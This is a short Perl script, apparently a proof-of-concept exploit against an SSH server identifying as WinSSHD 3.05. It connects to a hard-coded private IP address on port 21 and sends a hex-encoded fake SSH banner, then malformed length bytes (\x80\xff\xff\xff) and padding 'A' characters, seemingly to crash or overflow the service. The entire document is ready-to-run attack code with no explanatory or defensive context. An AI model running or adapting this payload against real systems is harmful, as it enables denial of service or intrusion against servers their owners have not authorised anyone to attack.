use IO::Socket;
 
$|=1;
 
$pl = "\x53\x53\x48\x2D\x32\x2E\x30\x2D\x31\x2E\x32\x37\x20\x73\x73\x68\x6C\x69\x62\x3A\x20\x57\x69\x6E\x53\x53".
"\x48\x44\x20\x33\x2E\x30\x35\x0D\x0A\x80\xff\xff\xff" . "AAAAAAAAAA";
 
my $sock = IO::Socket::INET->new(PeerAddr => "192.168.1.14",
                              PeerPort => '21',
                              Proto    => 'tcp');
 
read($sock, $xp, 10);
#$x = <stdin>;
print $sock $pl;
exit;
